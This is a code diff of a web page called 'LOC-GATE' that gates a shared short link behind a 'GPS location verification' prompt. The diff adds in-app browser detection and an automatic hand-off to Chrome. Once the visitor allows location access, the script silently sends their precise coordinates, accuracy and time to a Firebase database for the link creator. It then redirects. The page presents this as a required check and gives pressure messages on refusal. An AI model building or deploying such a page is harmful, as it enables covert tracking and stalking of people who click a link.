@@ -1,259 +1,329 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>LOC-GATE | Location Verification</title>
-    <style>
-        :root {
-            --bg-dark: #070b14;
-            --card-bg: rgba(17, 25, 40, 0.82);
-            --border-glow: rgba(16, 185, 129, 0.35);
-            --neon-green: #10b981;
-            --neon-hover: #059669;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LOC-GATE | Location Verification</title>
+  <style>
+    :root {
+      --bg-dark: #070b14;
+      --card-bg: rgba(17, 25, 40, 0.85);
+      --border-glow: rgba(16, 185, 129, 0.35);
+      --neon-green: #10b981;
+      --neon-hover: #059669;
+      --text-main: #f3f4f6;
+      --text-muted: #9ca3af;
+    }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-        }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    }
 
-        body {
-            background: radial-gradient(circle at top right, #0f2922, var(--bg-dark) 60%);
-            color: var(--text-main);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-        }
+    body {
+      background: radial-gradient(circle at top right, #0f2922, var(--bg-dark) 60%);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
 
-        .container {
-            width: 100%;
-            max-width: 420px;
-            background: var(--card-bg);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid var(--border-glow);
-            border-radius: 22px;
-            padding: 32px 24px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 25px rgba(16, 185, 129, 0.14);
-            text-align: center;
-        }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card-bg);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--border-glow);
+      border-radius: 22px;
+      padding: 30px 24px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 25px rgba(16, 185, 129, 0.14);
+      text-align: center;
+    }
 
-        .gate-icon {
-            width: 58px;
-            height: 58px;
-            border-radius: 50%;
-            background: rgba(16, 185, 129, 0.15);
-            border: 1px solid var(--border-glow);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 18px;
-            font-size: 26px;
-        }
+    .inapp-banner {
+      display: none;
+      background: rgba(245, 158, 11, 0.14);
+      border: 1px solid rgba(245, 158, 11, 0.45);
+      border-radius: 14px;
+      padding: 14px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
 
-        h1 {
-            font-size: 21px;
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
+    .inapp-banner h3 {
+      font-size: 14px;
+      color: #fbbf24;
+      margin-bottom: 6px;
+    }
 
-        p.subtitle {
-            font-size: 14px;
-            color: var(--text-muted);
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
+    .inapp-banner p {
+      font-size: 12.5px;
+      color: #e5e7eb;
+      line-height: 1.45;
+      margin-bottom: 10px;
+    }
 
-        .dest-preview {
-            background: rgba(0, 0, 0, 0.45);
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 13px;
-            color: var(--neon-green);
-            word-break: break-all;
-            margin-bottom: 22px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
+    .chrome-btn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border-radius: 10px;
+      background: #f59e0b;
+      color: #0b0f19;
+      font-size: 13.5px;
+      font-weight: 700;
+      text-align: center;
+      text-decoration: none;
+      cursor: pointer;
+      border: none;
+    }
 
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 12px;
-            background: var(--neon-green);
-            color: #031911;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 0 18px rgba(16, 185, 129, 0.35);
-        }
+    .gate-icon {
+      width: 58px;
+      height: 58px;
+      border-radius: 50%;
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid var(--border-glow);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      font-size: 26px;
+    }
 
-        .btn:hover {
-            background: var(--neon-hover);
-        }
+    h1 {
+      font-size: 21px;
+      margin-bottom: 10px;
+      font-weight: 700;
+    }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
+    p.subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
 
-        .btn-secondary {
-            background: transparent;
-            color: var(--text-muted);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: none;
-            margin-top: 10px;
-        }
+    .dest-preview {
+      background: rgba(0, 0, 0, 0.45);
+      padding: 12px;
+      border-radius: 12px;
+      font-size: 13px;
+      color: var(--neon-green);
+      word-break: break-all;
+      margin-bottom: 22px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
 
-        .status-msg {
-            margin-top: 16px;
-            font-size: 13px;
-            color: #fbbf24;
-            min-height: 20px;
-        }
-    </style>
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: var(--neon-green);
+      color: #031911;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 0 18px rgba(16, 185, 129, 0.35);
+    }
+
+    .btn:hover {
+      background: var(--neon-hover);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--text-muted);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: none;
+      margin-top: 10px;
+    }
+
+    .status-msg {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #fbbf24;
+      min-height: 20px;
+      line-height: 1.45;
+    }
+  </style>
 </head>
-
 <body>
 
-    <div class="container">
-        <div class="gate-icon">📍</div>
-        <h1>Location Verification Required</h1>
-        <p class="subtitle">
-            The link creator requires your GPS location verification before opening the destination URL below:
-        </p>
-
-        <div id="targetDisplay" class="dest-preview">Loading link...</div>
-
-        <button class="btn" id="allowBtn" onclick="verifyAndRedirect()" disabled>ALLOW &amp; CONTINUE</button>
-        <button class="btn btn-secondary" onclick="declineGate()">Decline</button>
-
-        <div id="statusMsg" class="status-msg"></div>
+  <div class="container">
+    <!-- In-App Browser Warning + Chrome Redirect -->
+    <div id="inAppBanner" class="inapp-banner">
+      <h3>⚠️ In-App Browser Detected</h3>
+      <p>WhatsApp/Social browsers block location verification. Open in Chrome to continue smoothly.</p>
+      <button class="chrome-btn" onclick="openInChrome()">Open in Google Chrome</button>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-        import { getDatabase, ref, get, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+    <div class="gate-icon">📍</div>
+    <h1>Location Verification Required</h1>
+    <p class="subtitle">
+      The link creator requires your GPS location verification before opening the destination URL below:
+    </p>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDDY5mO_arUXhhI-jHCxwOf5_KXrpp_DFY",
-            authDomain: "first-vigil-476213-e0.firebaseapp.com",
-            databaseURL: "https://first-vigil-476213-e0-default-rtdb.firebaseio.com",
-            projectId: "first-vigil-476213-e0",
-            storageBucket: "first-vigil-476213-e0.firebasestorage.app",
-            messagingSenderId: "463765441887",
-            appId: "1:463765441887:web:cf0d4c6ffca7036382baea",
-            measurementId: "G-SKDWC7G75X"
-        };
+    <div id="targetDisplay" class="dest-preview">Loading link...</div>
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        const logsRef = ref(db, 'locgate_verifications');
+    <button class="btn" id="allowBtn" onclick="verifyAndRedirect()" disabled>ALLOW &amp; CONTINUE</button>
+    <button class="btn btn-secondary" onclick="declineGate()">Decline</button>
 
-        const params = new URLSearchParams(window.location.search);
-        const shortId = params.get('id');
-        const targetDisplay = document.getElementById('targetDisplay');
-        const allowBtn = document.getElementById('allowBtn');
-        let targetUrl = '';
+    <div id="statusMsg" class="status-msg"></div>
+  </div>
 
-        async function loadDestination() {
-            if (!shortId) {
-                targetDisplay.textContent = 'No link ID provided.';
-                targetDisplay.style.color = '#9ca3af';
-                return;
-            }
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, get, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-            try {
-                const snap = await get(ref(db, `locgate_links/${shortId}`));
-                if (snap.exists() && snap.val().dest) {
-                    const parsed = new URL(snap.val().dest);
-                    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
-                        targetUrl = parsed.href;
-                        targetDisplay.textContent = targetUrl;
-                        allowBtn.disabled = false;
-                        return;
-                    }
-                }
-                targetDisplay.textContent = 'Invalid or expired short link.';
-                targetDisplay.style.color = '#ef4444';
-            } catch (err) {
-                targetDisplay.textContent = 'Failed to load link. Check connection.';
-                targetDisplay.style.color = '#ef4444';
-            }
+    const firebaseConfig = {
+      apiKey: "AIzaSyDDY5mO_arUXhhI-jHCxwOf5_KXrpp_DFY",
+      authDomain: "first-vigil-476213-e0.firebaseapp.com",
+      databaseURL: "https://first-vigil-476213-e0-default-rtdb.firebaseio.com",
+      projectId: "first-vigil-476213-e0",
+      storageBucket: "first-vigil-476213-e0.firebasestorage.app",
+      messagingSenderId: "463765441887",
+      appId: "1:463765441887:web:cf0d4c6ffca7036382baea",
+      measurementId: "G-SKDWC7G75X"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const logsRef = ref(db, 'locgate_verifications');
+
+    // Detect WhatsApp / Instagram / Facebook / WebView in-app browsers
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const isAndroid = /Android/i.test(ua);
+    const isInApp = /WhatsApp|FBAN|FBAV|Instagram|Line|MicroMessenger|wv\)/i.test(ua);
+
+    window.openInChrome = function () {
+      const currentUrl = window.location.href;
+      if (isAndroid) {
+        const cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+        const intentUrl = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
+        window.location.href = intentUrl;
+      } else {
+        alert('Tap the top-right menu (⋮ or Safari icon) and select "Open in Browser / Chrome".');
+      }
+    };
+
+    if (isInApp) {
+      document.getElementById('inAppBanner').style.display = 'block';
+      // Attempt automatic Chrome handoff on Android
+      if (isAndroid) {
+        setTimeout(() => {
+          window.openInChrome();
+        }, 400);
+      }
+    }
+
+    const params = new URLSearchParams(window.location.search);
+    const shortId = params.get('id');
+    const targetDisplay = document.getElementById('targetDisplay');
+    const allowBtn = document.getElementById('allowBtn');
+    let targetUrl = '';
+
+    async function loadDestination() {
+      if (!shortId) {
+        targetDisplay.textContent = 'No link ID provided.';
+        targetDisplay.style.color = '#9ca3af';
+        return;
+      }
+
+      try {
+        const snap = await get(ref(db, `locgate_links/${shortId}`));
+        if (snap.exists() && snap.val().dest) {
+          const parsed = new URL(snap.val().dest);
+          if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
+            targetUrl = parsed.href;
+            targetDisplay.textContent = targetUrl;
+            allowBtn.disabled = false;
+            return;
+          }
         }
+        targetDisplay.textContent = 'Invalid or expired short link.';
+        targetDisplay.style.color = '#ef4444';
+      } catch (err) {
+        targetDisplay.textContent = 'Failed to load link. Check connection.';
+        targetDisplay.style.color = '#ef4444';
+      }
+    }
 
-        loadDestination();
+    loadDestination();
 
-        window.verifyAndRedirect = function () {
-            const statusMsg = document.getElementById('statusMsg');
+    window.verifyAndRedirect = function () {
+      const statusMsg = document.getElementById('statusMsg');
 
-            if (!targetUrl) return;
-            if (!navigator.geolocation) {
-                statusMsg.textContent = 'Your browser does not support location.';
-                return;
-            }
+      if (!targetUrl) return;
+      if (!navigator.geolocation) {
+        statusMsg.textContent = 'Your browser does not support location.';
+        return;
+      }
 
-            allowBtn.disabled = true;
-            allowBtn.textContent = 'Verifying...';
-            statusMsg.style.color = '#fbbf24';
-            statusMsg.textContent = 'Tap "Allow" on the browser location prompt.';
+      allowBtn.disabled = true;
+      allowBtn.textContent = 'Verifying...';
+      statusMsg.style.color = '#fbbf24';
+      statusMsg.textContent = 'Tap "Allow" on the browser location prompt.';
 
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude.toFixed(6);
-                    const lng = position.coords.longitude.toFixed(6);
-                    const accuracy = Math.round(position.coords.accuracy);
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude.toFixed(6);
+          const lng = position.coords.longitude.toFixed(6);
+          const accuracy = Math.round(position.coords.accuracy);
 
-                    statusMsg.style.color = '#10b981';
-                    statusMsg.textContent = 'Verified! Opening link...';
+          statusMsg.style.color = '#10b981';
+          statusMsg.textContent = 'Verified! Opening link...';
 
-                    const writePromise = push(logsRef, {
-                        shortId,
-                        dest: targetUrl,
-                        lat,
-                        lng,
-                        accuracy: `${accuracy}m`,
-                        time: new Date().toLocaleString()
-                    }).catch(err => console.error('Firebase error:', err));
+          const writePromise = push(logsRef, {
+            shortId,
+            dest: targetUrl,
+            lat,
+            lng,
+            accuracy: `${accuracy}m`,
+            time: new Date().toLocaleString()
+          }).catch(err => console.error('Firebase error:', err));
 
-                    const timeoutCap = new Promise(resolve => setTimeout(resolve, 1200));
-                    await Promise.race([writePromise, timeoutCap]);
+          const timeoutCap = new Promise(resolve => setTimeout(resolve, 1200));
+          await Promise.race([writePromise, timeoutCap]);
 
-                    window.location.href = targetUrl;
-                },
-                (error) => {
-                    allowBtn.disabled = false;
-                    allowBtn.textContent = 'ALLOW & CONTINUE';
-                    statusMsg.style.color = '#ef4444';
+          window.location.href = targetUrl;
+        },
+        (error) => {
+          allowBtn.disabled = false;
+          allowBtn.textContent = 'ALLOW & CONTINUE';
+          statusMsg.style.color = '#ef4444';
 
-                    if (error.code === error.PERMISSION_DENIED) {
-                        statusMsg.textContent = 'Permission denied. Destination link cannot open without location verification.';
-                    } else {
-                        statusMsg.textContent = 'Location timeout. Turn on phone Location/GPS and try again.';
-                    }
-                },
-                {
-                    enableHighAccuracy: false,
-                    timeout: 6000,
-                    maximumAge: 1800000 // 30 minutes instant cache
-                }
-            );
-        };
+          if (error.code === error.PERMISSION_DENIED) {
+            document.getElementById('inAppBanner').style.display = 'block';
+            statusMsg.textContent = 'Permission denied. Open in Chrome or allow Location permission in browser site settings.';
+          } else {
+            statusMsg.textContent = 'Location timeout. Turn on phone Location/GPS and try again.';
+          }
+        },
+        {
+          enableHighAccuracy: false,
+          timeout: 6000,
+          maximumAge: 1800000 // 30 minutes instant cache
+        }
+      );
+    };
 
-        window.declineGate = function () {
-            document.getElementById('statusMsg').style.color = '#9ca3af';
-            document.getElementById('statusMsg').textContent = 'Verification cancelled. You may close this tab.';
-        };
-    </script>
+    window.declineGate = function () {
+      document.getElementById('statusMsg').style.color = '#9ca3af';
+      document.getElementById('statusMsg').textContent = 'Verification cancelled. You may close this tab.';
+    };
+  </script>
 </body>
-
 </html>
